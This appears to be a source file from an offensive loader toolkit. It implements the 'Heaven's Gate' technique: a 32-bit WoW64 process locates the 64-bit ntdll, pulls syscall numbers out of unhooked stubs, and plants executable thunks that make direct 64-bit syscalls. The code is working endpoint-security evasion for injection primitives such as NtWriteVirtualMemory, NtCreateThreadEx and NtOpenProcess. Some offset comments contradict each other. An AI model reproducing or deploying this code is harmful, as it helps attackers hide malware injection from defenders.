/**
 * @file heavens_gate.cpp
 * @brief Heaven's Gate syscall backend — 32-bit loader issuing native 64-bit syscalls.
 *
 * Active only when CONFIG_SYSCALL_BACKEND == 2 and ARCH == x86.
 *
 * Technique: on 64-bit Windows a WoW64 process has the full 64-bit ntdll
 * mapped at a second base address (typically 0x77xxx000 range, above the 4 GiB
 * boundary visible to 32-bit code as a near-pointer but still reachable via
 * the 64-bit TEB).  We walk the 64-bit ntdll EAT to find SSNs, store them in
 * a small table, and forward calls through the HvGateCall thunk in
 * heavens_gate.S which switches to CS:0x33, issues the syscall, and returns.
 *
 * SSN extraction reads the canonical clean stub prologue:
 *   4C 8B D1           mov r10, rcx
 *   B8 <ssn32>         mov eax, <ssn>
 * If the stub is hooked the entry is left NULL and callers fall back to
 * GetProcAddressC / hashed imports.
 */

#include "../../include/loader.hpp"
#include "../../include/evasion/heavens_gate.hpp"

#if defined(CONFIG_SYSCALL_BACKEND) && CONFIG_SYSCALL_BACKEND == 2

namespace erebus {
namespace evasion {

// ---------------------------------------------------------------------------
// WoW64 internals needed to locate the 64-bit ntdll.
// ---------------------------------------------------------------------------

// The 64-bit Process Environment Block is stored at GS:[0x60] in a 64-bit
// process, but in WoW64 we reach it via the 32-bit TEB's WoW64Reserved field.
// A simpler approach: read the LDR data from the 64-bit PEB directly via the
// 64-bit TEB.  We use the well-known offsets:
//   32-bit TEB  fs:[0]
//   TEB64 is stored at fs:[0xF70] (WoW64 TEB extension) on Win8+.
//   PEB64 = TEB64.ProcessEnvironmentBlock  (TEB64+0x60)
//   PEB64.Ldr = PEB64+0x18
//   Ldr->InLoadOrderModuleList = Ldr+0x10  (LIST_ENTRY of LDR_DATA_TABLE_ENTRY64)
//
// All offsets are 64-bit-view offsets even though we are a 32-bit process.
// We access them using __asm__ fs/gs overrides and MOV instructions that
// the CPU decodes in 64-bit mode when we momentarily switch via Heaven's Gate,
// or via direct reads if the OS guarantees the mapping is in the first 4 GiB.
//
// Simplest portable approach for ARCH=x86: use the WoW64 intrinsic
// __readfsdword to find the TEB64 extension, then do pointer arithmetic.

static PVOID GetNtdll64Base()
{
    // On WoW64 the 32-bit FS:[0] TEB has a pointer to the 64-bit TEB at
    // offset 0xF70 (Windows 8+, all relevant versions).  The 64-bit TEB is
    // always below 4 GiB on all Windows versions tested, so we can hold it
    // in a 32-bit pointer.
    DWORD teb64_lo = __readfsdword(0xF70);
    if (!teb64_lo) return NULL;

    // TEB64.ProcessEnvironmentBlock @ +0x60
    DWORD peb64_lo = *(DWORD*)(teb64_lo + 0x60);
    if (!peb64_lo) return NULL;

    // PEB64.Ldr @ +0x18 (pointer-sized, but stays below 4 GiB)
    DWORD ldr_lo = *(DWORD*)(peb64_lo + 0x18);
    if (!ldr_lo) return NULL;

    // Ldr->InMemoryOrderModuleList @ +0x20 (head of doubly-linked list)
    // LDR_DATA_TABLE_ENTRY64.InMemoryOrderLinks is at entry+0x10.
    // entry+0x40 = DllBase (PVOID64, low 32 bits at +0x40 on 64-bit layout)
    //
    // Walk the list: first three entries are typically
    //   1. the executable itself
    //   2. ntdll (64-bit ntdll is always second in memory-order list on WoW64)
    //   3. wow64.dll
    //
    // We match on BaseDllName: walk until we find "ntdll.dll".

    DWORD flink = *(DWORD*)(ldr_lo + 0x20);    // InMemoryOrderModuleList.Flink

    // Each entry: LDR_DATA_TABLE_ENTRY64 (64-bit), but we read only the fields
    // that fall within the first 4 GiB.
    // Offsets within LDR_DATA_TABLE_ENTRY64 (Win10 x64):
    //   +0x00  InLoadOrderLinks (LIST_ENTRY64: two 8-byte pointers)
    //   +0x10  InMemoryOrderLinks
    //   +0x20  InInitializationOrderLinks
    //   +0x30  DllBase (PVOID64)
    //   +0x38  EntryPoint
    //   +0x40  SizeOfImage
    //   +0x44  pad
    //   +0x48  FullDllName (UNICODE_STRING64: Length[2] + Buffer[8])
    //   +0x58  BaseDllName (UNICODE_STRING64)
    //
    // list node ptr points to InMemoryOrderLinks (+0x10), so
    // real entry base = flink - 0x10.

    for (int i = 0; i < 16 && flink; i++)
    {
        DWORD entry = flink - 0x10;             // real LDR_DATA_TABLE_ENTRY64 base

        // BaseDllName @ entry+0x58:
        //   +0x58  Length   (USHORT)
        //   +0x5A  MaxLength(USHORT)
        //   +0x5C  pad
        //   +0x60  Buffer   (PWSTR, 8 bytes; low 32 at +0x60)
        USHORT nameLen = *(USHORT*)(entry + 0x58);
        DWORD  nameBuf = *(DWORD*)(entry + 0x60);

        if (nameBuf && nameLen >= 18) // "ntdll.dll" = 9 wchars = 18 bytes
        {
            // Case-insensitive compare the first 9 wide chars
            WCHAR* name = (WCHAR*)nameBuf;
            if ((name[0]|0x20) == L'n' && (name[1]|0x20) == L't' &&
                (name[2]|0x20) == L'd' && (name[3]|0x20) == L'l' &&
                (name[4]|0x20) == L'l' &&  name[5]        == L'.' &&
                (name[6]|0x20) == L'd' && (name[7]|0x20) == L'l' &&
                (name[8]|0x20) == L'l')
            {
                // DllBase @ entry+0x30 (PVOID64; assume high word == 0)
                DWORD dllBase = *(DWORD*)(entry + 0x30);
                return (PVOID)dllBase;
            }
        }

        // Advance: InMemoryOrderLinks.Flink @ flink+0 (low 32 bits)
        flink = *(DWORD*)flink;
    }
    return NULL;
}

// ---------------------------------------------------------------------------
// Walk the 64-bit ntdll EAT in 32-bit mode.
// The PE header is always in the first 4 GiB, so ordinary 32-bit pointers work.
// ---------------------------------------------------------------------------
static ULONG ExtractSsn64(PBYTE base, DWORD rva)
{
    PBYTE stub = base + rva;
    // 64-bit clean stub: 4C 8B D1 (mov r10,rcx)  B8 xx xx xx xx (mov eax, ssn)
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8)
    {
        ULONG ssn = 0;
        RtlCopyMemory(&ssn, stub + 4, 4);
        return ssn;
    }
    return 0xFFFFFFFF;
}

// ---------------------------------------------------------------------------
// Registry and stub table.
// ---------------------------------------------------------------------------
struct HvEntry {
    ULONG funcHash;
    ULONG ssn;
    PVOID stub;   // points into g_hv_page; casts to Nt* sig directly
};

static HvEntry g_hv[] = {
    { H("NtProtectVirtualMemory"),     0xFFFFFFFF, NULL },
    { H("NtAllocateVirtualMemory"),    0xFFFFFFFF, NULL },
    { H("NtWriteVirtualMemory"),       0xFFFFFFFF, NULL },
    { H("NtCreateSection"),            0xFFFFFFFF, NULL },
    { H("NtMapViewOfSection"),         0xFFFFFFFF, NULL },
    { H("NtUnmapViewOfSection"),       0xFFFFFFFF, NULL },
    { H("NtFreeVirtualMemory"),        0xFFFFFFFF, NULL },
    { H("NtClose"),                    0xFFFFFFFF, NULL },
    { H("NtWaitForSingleObject"),      0xFFFFFFFF, NULL },
    { H("NtCreateTimer"),              0xFFFFFFFF, NULL },
    { H("NtSetTimer"),                 0xFFFFFFFF, NULL },
    { H("NtLockVirtualMemory"),        0xFFFFFFFF, NULL },
    { H("NtUnlockVirtualMemory"),      0xFFFFFFFF, NULL },
    { H("NtCreateThreadEx"),           0xFFFFFFFF, NULL },
    { H("NtOpenProcess"),              0xFFFFFFFF, NULL },
    { H("NtCreateMutant"),             0xFFFFFFFF, NULL },
    { H("NtQueryPerformanceCounter"),  0xFFFFFFFF, NULL },
};
static const SIZE_T g_hv_count = sizeof(g_hv) / sizeof(g_hv[0]);

// Each stub is a tiny 32-bit thunk:
//   push  ssn
//   push  ret_addr  (patched at plant time - not needed; we use a trampoline call)
//
// Simpler: the stub is a 32-bit thunk that:
//   1. pops the return address
//   2. loads SSN into eax, pushes it as first arg before the caller's args
//   3. calls HvGateCall
//   4. ret (cleaned by HvGateCall's stdcall convention)
//
// Actual layout (14 bytes):
//   pop  ecx                  ; save return address (1)
//   push imm32 ssn            ; push ssn as first arg (5)
//   push ecx                  ; restore return address (1)
//   jmp  _HvGateCall          ; tail-call (5)  — rel32 patched at plant time
//   (2 bytes padding / nop)
static const SIZE_T HV_STUB_SIZE = 14;
static PBYTE        g_hv_page    = NULL;
static BOOL         g_hv_init    = FALSE;

extern "C" NTSTATUS __cdecl HvGateCall(ULONG ssn, ...);

static void PlantHvStub(PBYTE dst, ULONG ssn)
{
    // pop ecx
    dst[0] = 0x59;
    // push imm32 ssn
    dst[1] = 0x68;
    RtlCopyMemory(dst + 2, &ssn, 4);
    // push ecx
    dst[6] = 0x51;
    // jmp rel32 HvGateCall  (E9 <rel32>)
    DWORD target = (DWORD)(DWORD_PTR)HvGateCall;
    DWORD from   = (DWORD)(DWORD_PTR)(dst + 7 + 5);
    DWORD rel32  = target - from;
    dst[7] = 0xE9;
    RtlCopyMemory(dst + 8, &rel32, 4);
    // nop nop
    dst[12] = 0x90;
    dst[13] = 0x90;
}

BOOL InitHeavensGate()
{
    if (g_hv_init) return TRUE;

    PBYTE ntdll64 = (PBYTE)GetNtdll64Base();
    if (!ntdll64)
    {
        LOG_ERROR("Heaven's Gate: could not locate 64-bit ntdll (not WoW64?)");
        return FALSE;
    }
    LOG_INFO("Heaven's Gate: 64-bit ntdll @ 0x%08lX", (DWORD)(DWORD_PTR)ntdll64);

    // Walk 64-bit ntdll EAT
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll64;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS32 nt32 = (PIMAGE_NT_HEADERS32)(ntdll64 + dos->e_lfanew);
    // Use the 64-bit optional header sizes. IMAGE_NT_HEADERS64 has the same
    // layout prefix as NT_HEADERS32 up to DataDirectory, so we can cast to
    // IMAGE_NT_HEADERS64 to get the right DataDirectory offset.
    PIMAGE_NT_HEADERS64 nt64 = (PIMAGE_NT_HEADERS64)(ntdll64 + dos->e_lfanew);
    if (nt64->Signature != IMAGE_NT_SIGNATURE) return FALSE;

    DWORD exportRva = nt64->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exportRva) return FALSE;
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)(ntdll64 + exportRva);

    DWORD* names    = (DWORD*)(ntdll64 + exp->AddressOfNames);
    WORD*  ordinals = (WORD*)(ntdll64  + exp->AddressOfNameOrdinals);
    DWORD* funcs    = (DWORD*)(ntdll64 + exp->AddressOfFunctions);

    // Allocate stub page
    SIZE_T alloc_size = ((g_hv_count * HV_STUB_SIZE) + 0xFFF) & ~(SIZE_T)0xFFF;
    g_hv_page = (PBYTE)VirtualAlloc(NULL, alloc_size,
                                    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!g_hv_page) return FALSE;

    // Walk EAT and match against our hash table
    SIZE_T resolved = 0;
    for (DWORD j = 0; j < exp->NumberOfNames; j++)
    {
        const char* name = (const char*)(ntdll64 + names[j]);
        ULONG hash = erebus::HashStringFowlerNollVoVariant1a(name);

        for (SIZE_T k = 0; k < g_hv_count; k++)
        {
            if (g_hv[k].funcHash == hash && g_hv[k].ssn == 0xFFFFFFFF)
            {
                DWORD rva = funcs[ordinals[j]];
                ULONG ssn = ExtractSsn64(ntdll64, rva);
                if (ssn == 0xFFFFFFFF) break;

                PBYTE slot = g_hv_page + (k * HV_STUB_SIZE);
                PlantHvStub(slot, ssn);
                g_hv[k].ssn  = ssn;
                g_hv[k].stub = slot;
                resolved++;
                break;
            }
        }
    }

    if (resolved == 0)
    {
        VirtualFree(g_hv_page, 0, MEM_RELEASE);
        g_hv_page = NULL;
        return FALSE;
    }

    // Flip stubs to RX
    DWORD oldProtect = 0;
    if (!VirtualProtect(g_hv_page, alloc_size, PAGE_EXECUTE_READ, &oldProtect))
    {
        VirtualFree(g_hv_page, 0, MEM_RELEASE);
        g_hv_page = NULL;
        return FALSE;
    }

    g_hv_init = TRUE;
    LOG_SUCCESS("Heaven's Gate: %zu/%zu syscalls resolved", resolved, g_hv_count);
    return TRUE;
}

PVOID GetHeavensGateStub(ULONG funcHash)
{
    if (!g_hv_init) return NULL;
    for (SIZE_T i = 0; i < g_hv_count; i++) {
        if (g_hv[i].funcHash == funcHash)
            return g_hv[i].stub;
    }
    return NULL;
}

} // namespace evasion
} // namespace erebus

#endif // CONFIG_SYSCALL_BACKEND == 2
